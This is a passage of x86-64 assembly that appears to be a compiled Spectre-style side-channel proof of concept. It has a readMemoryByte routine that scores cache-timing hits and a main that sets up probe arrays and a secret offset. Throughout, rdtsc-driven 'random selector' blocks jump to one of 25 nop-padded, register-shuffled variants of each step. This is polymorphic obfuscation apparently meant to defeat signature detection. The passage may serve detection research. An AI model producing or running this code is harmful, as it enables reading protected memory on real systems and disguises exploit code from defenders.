	je	.LreadMemoryByte_win1_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win1_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win1_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win1_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win1_var24
	jmp	.LreadMemoryByte_win1_var0
## Variant 0
.LreadMemoryByte_win1_var0:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 1
.LreadMemoryByte_win1_var1:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 2
.LreadMemoryByte_win1_var2:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 3
.LreadMemoryByte_win1_var3:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 4
.LreadMemoryByte_win1_var4:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 5
.LreadMemoryByte_win1_var5:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 6
.LreadMemoryByte_win1_var6:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 7
.LreadMemoryByte_win1_var7:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	leaq	(%rax,%rcx,4), %r10
	nop
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 8
.LreadMemoryByte_win1_var8:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 9
.LreadMemoryByte_win1_var9:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 10
.LreadMemoryByte_win1_var10:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 11
.LreadMemoryByte_win1_var11:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 12
.LreadMemoryByte_win1_var12:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 13
.LreadMemoryByte_win1_var13:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 14
.LreadMemoryByte_win1_var14:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 15
.LreadMemoryByte_win1_var15:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 16
.LreadMemoryByte_win1_var16:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 17
.LreadMemoryByte_win1_var17:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 18
.LreadMemoryByte_win1_var18:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 19
.LreadMemoryByte_win1_var19:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	nop
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 20
.LreadMemoryByte_win1_var20:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 21
.LreadMemoryByte_win1_var21:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	nop
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 22
.LreadMemoryByte_win1_var22:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	nop
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 23
.LreadMemoryByte_win1_var23:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	leaq	(%rax,%rcx,4), %r10
	movl	(%r10), %eax
	leaq	-64(%rbp), %r10
	movslq	(%r10), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 24
.LreadMemoryByte_win1_var24:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
.LreadMemoryByte_win1_continue:
	cmpl	(%rcx,%rdx,4), %eax
	jl	LBB1_33
LBB1_32:                                ##   in Loop: Header=BB1_26 Depth=2
	movl	-56(%rbp), %eax
	movl	%eax, -64(%rbp)
LBB1_33:                                ##   in Loop: Header=BB1_26 Depth=2
	jmp	LBB1_34
LBB1_34:                                ##   in Loop: Header=BB1_26 Depth=2
	jmp	LBB1_35
LBB1_35:                                ##   in Loop: Header=BB1_26 Depth=2
	movl	-56(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -56(%rbp)
	jmp	LBB1_26
LBB1_36:                                ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	movl	(%rcx,%rdx,4), %ecx
	shll	%ecx
	addl	$5, %ecx
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win0_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win0_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win0_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win0_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win0_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win0_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win0_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win0_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win0_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win0_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win0_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win0_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win0_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win0_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win0_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win0_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win0_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win0_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win0_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win0_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win0_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win0_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win0_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win0_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win0_var24
	jmp	.LreadMemoryByte_win0_var0
## Variant 0
.LreadMemoryByte_win0_var0:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 1
.LreadMemoryByte_win0_var1:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 2
.LreadMemoryByte_win0_var2:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 3
.LreadMemoryByte_win0_var3:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 4
.LreadMemoryByte_win0_var4:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 5
.LreadMemoryByte_win0_var5:
	popq	%rax
	nop
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 6
.LreadMemoryByte_win0_var6:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	nop
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 7
.LreadMemoryByte_win0_var7:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	nop
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 8
.LreadMemoryByte_win0_var8:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 9
.LreadMemoryByte_win0_var9:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 10
.LreadMemoryByte_win0_var10:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 11
.LreadMemoryByte_win0_var11:
	popq	%rax
	nop
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 12
.LreadMemoryByte_win0_var12:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 13
.LreadMemoryByte_win0_var13:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 14
.LreadMemoryByte_win0_var14:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 15
.LreadMemoryByte_win0_var15:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 16
.LreadMemoryByte_win0_var16:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 17
.LreadMemoryByte_win0_var17:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 18
.LreadMemoryByte_win0_var18:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 19
.LreadMemoryByte_win0_var19:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 20
.LreadMemoryByte_win0_var20:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	nop
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 21
.LreadMemoryByte_win0_var21:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 22
.LreadMemoryByte_win0_var22:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 23
.LreadMemoryByte_win0_var23:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 24
.LreadMemoryByte_win0_var24:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
.LreadMemoryByte_win0_continue:
	jne	LBB1_40
## %bb.38:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-64(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$0, (%rax,%rcx,4)
	jne	LBB1_40
LBB1_39:
	jmp	LBB1_42
LBB1_40:                                ##   in Loop: Header=BB1_5 Depth=1
	jmp	LBB1_41
LBB1_41:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	-52(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -52(%rbp)
	jmp	LBB1_5
LBB1_42:
	movl	-60(%rbp), %eax
	movb	%al, %cl
	movq	-40(%rbp), %rax
	movb	%cl, (%rax)
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %ecx
	movq	-48(%rbp), %rax
	movl	%ecx, (%rax)
	movl	-64(%rbp), %eax
	movb	%al, %cl
	movq	-40(%rbp), %rax
	movb	%cl, 1(%rax)
	movslq	-64(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %ecx
	movq	-48(%rbp), %rax
	movl	%ecx, 4(%rax)
	movl	-72(%rbp), %eax
	xorl	_readMemoryByte.results(%rip), %eax
	movl	%eax, _readMemoryByte.results(%rip)
	addq	$144, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_main                           ## -- Begin function main
	.p2align	4, 0x90
_main:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$80, %rsp
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movl	$0, -20(%rbp)
	movl	%edi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movl	$80, -36(%rbp)
	movq	_secret(%rip), %rax
	leaq	_array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, -48(%rbp)
	movl	$40, -52(%rbp)
	movl	$0, -60(%rbp)
LBB2_1:                                 ## =>This Inner Loop Header: Depth=1
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win6_var0
	cmpl	$1, %eax
	je	.Lmain_win6_var1
	cmpl	$2, %eax
	je	.Lmain_win6_var2
	cmpl	$3, %eax
	je	.Lmain_win6_var3
	cmpl	$4, %eax
	je	.Lmain_win6_var4
	cmpl	$5, %eax
	je	.Lmain_win6_var5
	cmpl	$6, %eax
	je	.Lmain_win6_var6
	cmpl	$7, %eax
	je	.Lmain_win6_var7
	cmpl	$8, %eax
	je	.Lmain_win6_var8
	cmpl	$9, %eax
	je	.Lmain_win6_var9
	cmpl	$10, %eax
	je	.Lmain_win6_var10
	cmpl	$11, %eax
	je	.Lmain_win6_var11
	cmpl	$12, %eax
	je	.Lmain_win6_var12
	cmpl	$13, %eax
	je	.Lmain_win6_var13
	cmpl	$14, %eax
	je	.Lmain_win6_var14
	cmpl	$15, %eax
	je	.Lmain_win6_var15
	cmpl	$16, %eax
	je	.Lmain_win6_var16
	cmpl	$17, %eax
	je	.Lmain_win6_var17
	cmpl	$18, %eax
	je	.Lmain_win6_var18
	cmpl	$19, %eax
	je	.Lmain_win6_var19
	cmpl	$20, %eax
	je	.Lmain_win6_var20
	cmpl	$21, %eax
	je	.Lmain_win6_var21
	cmpl	$22, %eax
	je	.Lmain_win6_var22
	cmpl	$23, %eax
	je	.Lmain_win6_var23
	cmpl	$24, %eax
	je	.Lmain_win6_var24
	jmp	.Lmain_win6_var0
## Variant 0
.Lmain_win6_var0:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
